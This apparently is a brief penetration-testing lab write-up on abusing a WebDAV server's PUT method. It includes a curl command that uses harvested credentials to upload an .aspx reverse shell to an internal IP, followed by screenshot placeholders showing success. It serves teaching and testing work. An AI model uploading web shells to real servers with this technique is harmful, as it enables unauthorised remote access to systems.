# Insecure HTTP Method Abuse

## Introduction

This is an uncommon thing for public web pages to have, but say we come across an internal WebDAV server that allows the following HTTP methods for authenticated users.

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

In the following example, I'll abuse the "<mark style="color:yellow;">**PUT**</mark>" method to upload a malicious file to the web server w/ credentials I harvested.&#x20;

## Exploit

### Upload .aspx reverse shell

In order to upload a file, we'll need a set of credentials. Lucky enough we have them.&#x20;

```shell-session
$ curl -T shell.aspx http://fmcsorley:CrabSharkJellyfish192@192.168.191.122/
```

### Navigate to page

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

### Success!

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>
